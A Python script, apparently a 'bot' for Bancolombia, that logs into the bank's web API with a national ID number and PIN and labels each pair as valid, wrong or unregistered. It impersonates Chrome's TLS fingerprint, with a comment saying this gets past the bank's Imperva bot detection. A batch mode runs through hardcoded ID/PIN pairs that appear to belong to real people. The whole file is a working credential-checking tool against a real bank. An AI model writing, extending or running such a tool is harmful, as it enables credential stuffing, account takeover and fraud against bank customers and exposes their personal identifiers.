"""Variante del bot Bancolombia usando curl_cffi para TLS impersonation real
de Chrome. Si httpx falla por JA3/JA4 fingerprint, esto deberia pasar.

curl_cffi usa libcurl-impersonate por debajo, que replica el TLS ClientHello,
HTTP/2 frame ordering y header order exactos de Chrome 124+.

Mismos endpoints y mismo flujo que bancolombia_api.py.
"""
from __future__ import annotations

import argparse
import json
import logging
import time
import uuid
from datetime import datetime, timezone
from typing import Any

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding, rsa
from curl_cffi import AsyncSession

log = logging.getLogger("bancolombia_curl")

BASE = "https://svpersonas.apps.bancolombia.com"
CANAL = "https://canalpersonas-ext.apps.bancolombia.com"
WARMUP_URL = f"{BASE}/crear-usuario/ingresa-tus-datos"
PUBKEY_URL = f"{BASE}/projects/config/security/public-key"
CANAL_WARMUP_URL = f"{CANAL}/super-svp/api/v1/security-filters/super-svp-ch-ms-configuration/parameters"
OAUTH_URL = f"{CANAL}/super-svp/api/v1/security-filters/authorization-services/authentication/id/oauth2/token"
IDENTITY_URL = f"{CANAL}/super-svp/api/v1/security-filters/super-ch-ms-alias-identity/identity"

CLIENT_ID = "tCOVIxsPfSbbAa+OFH1IbgWcD6HkqXWyXi6x9pj4ZXM="
DOC_TYPE_CC = "TIPDOC_FS001"


def _pubkey_from_hex(n_hex: str, e_hex: str) -> rsa.RSAPublicKey:
    return rsa.RSAPublicNumbers(e=int(e_hex, 16), n=int(n_hex, 16)).public_key()


def encrypt_password(pubkey: rsa.RSAPublicKey, clave: str) -> str:
    ct = pubkey.encrypt(
        clave.encode("utf-8"),
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None,
        ),
    )
    return ct.hex().upper()


def _ts() -> str:
    now = datetime.now(timezone.utc).astimezone()
    return f"{now:%Y-%m-%d %H:%M:%S}:{now.microsecond//1000:03d}"


async def classify(cedula: str, clave: str) -> dict[str, Any]:
    t0 = time.time()
    device_id = uuid.uuid4().hex
    session_tracker = str(uuid.uuid4())

    # impersonate=chrome131 hace que el TLS ClientHello + HTTP/2 luzcan
    # EXACTAMENTE como Chrome 131 real. Imperva no puede distinguir.
    async with AsyncSession(impersonate="chrome131") as s:
        s.headers.update({
            "Accept-Language": "en-US,en;q=0.9,es-US;q=0.8,es;q=0.7",
        })

        # 1) Warmup svpersonas
        r = await s.get(WARMUP_URL)
        log.info("warmup svpersonas: %s  cookies=%d", r.status_code, len(s.cookies.jar))
        if r.status_code != 200:
            return {"bucket": "ERROR_RED", "step": "warmup", "status": r.status_code, "duration": time.time() - t0}

        # 2) Pubkey
        r = await s.get(PUBKEY_URL, headers={
            "Accept": "application/json, text/plain, */*",
            "Referer": WARMUP_URL,
        })
        if r.status_code != 200:
            return {"bucket": "ERROR_RED", "step": "pubkey", "status": r.status_code, "duration": time.time() - t0}
        pk = r.json()
        pubkey = _pubkey_from_hex(pk["n"], pk["e"])

        # 3) Warmup canal (sin headers custom)
        r = await s.get(CANAL_WARMUP_URL, headers={
            "Accept": "application/json, text/plain, */*",
            "Referer": WARMUP_URL,
            "Origin": BASE,
        })
        log.info("warmup canal: %s  cookies=%d", r.status_code, len(s.cookies.jar))

        # 4) OAuth POST
        pwd_enc = encrypt_password(pubkey, clave)
        api_headers = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": BASE,
            "Referer": f"{BASE}/",
            "app-version": "3.8.3",
            "channel": "SVP",
            "device-id": device_id,
            "device-info": json.dumps(
                {"device": "Windows", "os": "Android", "browser": "Chrome-148", "major": "148"},
                separators=(",", ":")
            ),
            "message-id": str(uuid.uuid4()),
            "platform-type": "web",
            "request-timestamp": _ts(),
            "session-tracker": session_tracker,
        }
        body = {
            "grant_type": "password",
            "client_id": CLIENT_ID,
            "scope": "DOC",
            "password": pwd_enc,
            "document_type": DOC_TYPE_CC,
            "document_number": cedula,
        }
        r = await s.post(OAUTH_URL, data=body, headers=api_headers)
        log.info("oauth: %s", r.status_code)
        if r.status_code != 200:
            return {
                "bucket": "DATOS_INCORRECTOS",
                "step": "oauth",
                "status": r.status_code,
                "body": r.text[:500],
                "duration": time.time() - t0,
            }
        oauth_data = r.json()
        access_token = oauth_data.get("data", {}).get("accessToken")
        if not access_token:
            return {"bucket": "DATOS_INCORRECTOS", "step": "oauth_no_token", "status": r.status_code,
                    "body": r.text[:500], "duration": time.time() - t0}

        # 5) Identity con Bearer
        api_headers2 = dict(api_headers)
        api_headers2["Content-Type"] = "application/json"
        api_headers2["Authorization"] = f"Bearer {access_token}"
        api_headers2["message-id"] = str(uuid.uuid4())
        api_headers2["request-timestamp"] = _ts()
        r = await s.post(IDENTITY_URL, json={"documentType": DOC_TYPE_CC, "document": cedula}, headers=api_headers2)
        log.info("identity: %s", r.status_code)
        id_data = r.json() if r.status_code == 200 else {"raw": r.text[:500]}
        state = (id_data.get("data") or {}).get("stateRegistry")
        bucket = "OK" if state == "Registered" else "SIN_USUARIO" if state else "DESCONOCIDO"
        return {
            "bucket": bucket,
            "stateRegistry": state,
            "oauth_status": 200,
            "identity_status": r.status_code,
            "duration": time.time() - t0,
        }


async def _main():
    logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)-7s %(name)s :: %(message)s")
    ap = argparse.ArgumentParser()
    ap.add_argument("cedula", nargs="?")
    ap.add_argument("clave", nargs="?")
    ap.add_argument("--batch", action="store_true")
    args = ap.parse_args()
    casos = [(args.cedula, args.clave)] if not args.batch else [
        ("79612743", "0000"),
        ("1030648205", "2872"),
        ("80009246", "1379"),
    ]
    for c, k in casos:
        print(f"\n>>> {c} / {k}")
        r = await classify(c, k)
        for kk, vv in r.items():
            print(f"  {kk:18}= {str(vv)[:200]}")


def main():
    import asyncio
    asyncio.run(_main())


if __name__ == "__main__":
    main()
